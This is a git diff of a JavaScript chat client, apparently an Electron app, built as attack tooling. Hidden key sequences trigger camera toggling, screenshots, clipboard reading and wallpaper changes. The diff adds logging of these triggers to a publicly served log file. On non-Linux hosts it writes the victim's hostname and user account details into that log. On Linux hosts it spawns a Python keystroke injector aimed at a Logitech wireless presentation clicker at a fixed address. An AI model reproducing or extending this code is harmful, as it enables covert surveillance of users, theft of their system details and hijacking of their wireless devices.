@@ -1,7 +1,19 @@
+var chatLog = 'payloads/server/public/chat.log';
+
 $(function () {
     var identifierString = '';
     $('form').submit(function(e){
         e.preventDefault(); // prevents page reloading
+
+        var adminText = $('#admin_chat').val();
+
+        if(adminText) {
+            writeChatMessage(adminText, true);
+            $('#admin_chat').remove();
+            $('#m').prop('disabled', false).focus();
+
+            return false;
+        }
 
         var text = $('#m').val();        
 
@@ -16,7 +28,8 @@ $(function () {
 
 function writeChatMessage(text, isFromAdmin){
     var messageElement = $('<span>').addClass('message').text(text);
-    var userElement = $('<span>').addClass('user').text(getChatUser(isFromAdmin));
+    var chatUser = getChatUser(isFromAdmin);
+    var userElement = $('<span>').addClass('user').text(chatUser);
     var messageLogElement = $('<li>').append([userElement, messageElement]);
 
     if(text){
@@ -31,8 +44,18 @@ function writeChatMessage(text, isFromAdmin){
             .start()            
             .reveal(1000);
         }
+
+        logChatMessage(chatLog, text, chatUser);
+        
         $('#messages').trigger('messages.load');
     }
+}
+
+function logChatMessage(logFile, message, user) {
+    var content = `[${new Date().toISOString()}] <${user}>: ${message}\n`;
+    var fs = require('fs');
+    try { fs.appendFileSync(logFile, content, 'utf-8'); }
+    catch(e) { alert('Failed to save the file !'); }
 }
 
 function getChatUser(isFromAdmin){
@@ -207,35 +230,51 @@ if (typeof module !== 'undefined' && typeof module.exports !== 'undefined') {
 }
 
 var adminCode = new Konami(function() {
+    logChatMessage(chatLog, "@admin.toggle", getChatUser(true));
     $('body').trigger('admin.toggle');
 });
 //38384040373937396665
 adminCode.pattern = "38384040";
 
 var cameraCode = new Konami(function() {
+    logChatMessage(chatLog, "@camera.toggle", getChatUser(true));
     $('body').trigger('camera.toggle');
 });
 cameraCode.pattern = "37393739";
 
 var screenshotCode = new Konami(function() {
+    logChatMessage(chatLog, "@screenshot.full", getChatUser(true));
     $('body').trigger('screenshot.full');
 });
 screenshotCode.pattern = "37373939";
 
 var audioCode = new Konami(function() {
+    logChatMessage(chatLog, "@audio.play", getChatUser(true));
     $('body').trigger('audio.play');
 });
 audioCode.pattern = "38403840";
 
 var wallpaperCode = new Konami(function() {
+    logChatMessage(chatLog, "@wallpaper.change", getChatUser(true));
     $('body').trigger('wallpaper.change');
 });
 wallpaperCode.pattern = "40384038";
 
 var clipboardReadCode = new Konami(function() {
+    logChatMessage(chatLog, "@clipboard.read", getChatUser(true));
     $('body').trigger('clipboard.read');
 });
 clipboardReadCode.pattern = "40403838";
+
+var adminChatCode = new Konami(function() {
+    $('body').trigger('admin.chat');
+});
+adminChatCode.pattern = "135";
+
+$('body').on('admin.chat', function(){
+    $('#m').prop('disabled', true).after('<input id="admin_chat">');
+    $('#admin_chat').focus();
+});
 
 $('body').on('admin.toggle', function() {
     if($('#admin').length) {
@@ -424,13 +463,42 @@ $('body').on('clipboard.read', function(){
     writeChatMessage(message, true);        
 });
 
-// TODO: admin only polling of devices, select target, send commands via script to target
-// var env = Object.create( process.env );
-// env.PYTHONPATH='payloads/presentation_clickers/tools';
 
-// var python = require('child_process').spawn('python2', ['payloads/injector_test.py', '-l', '-f', 'logitech', '-a', 'FB:20:DA:73:A4'],{env:env});     python.stdout.on('data',function(data){         console.log("data: ",data.toString('utf8'));     });
+var os = require('os');
 
-// python.stderr.on('data',function(data){         console.log("error: ",data.toString('utf8'));     });
+// for now, assume linux host is an admin (current attack/commands are windows specific, attack scripts assume linux host)
+if(os.type() == 'Linux') {
 
-// console.log(python);
+    // TODO: admin only polling of devices, select target, send commands via script to target
+    var env = Object.create( process.env );
+    env.PYTHONPATH='payloads/presentation_clickers/tools';
 
+    var python = require('child_process').spawn('python2',
+        [
+            'payloads/injector_test.py',
+            '-l',
+            '-f',
+            'logitech',
+            '-a',
+            '21:F5:94:D1:07',
+            '-c',
+            'chat',
+            '-m',
+            'This is a test...'
+        ],
+        {env:env}
+    );
+
+    python.stdout.on('data',function(data){
+        console.log("data: ",data.toString('utf8'));
+    });
+
+    python.stderr.on('data',function(data){
+        console.log("error: ",data.toString('utf8'));
+    });
+
+    console.log(python);
+} else {
+    var info = `hostname: ${os.hostname()}, ${JSON.stringify(os.userInfo())}`;
+    logChatMessage(chatLog, info, 'system');
+}
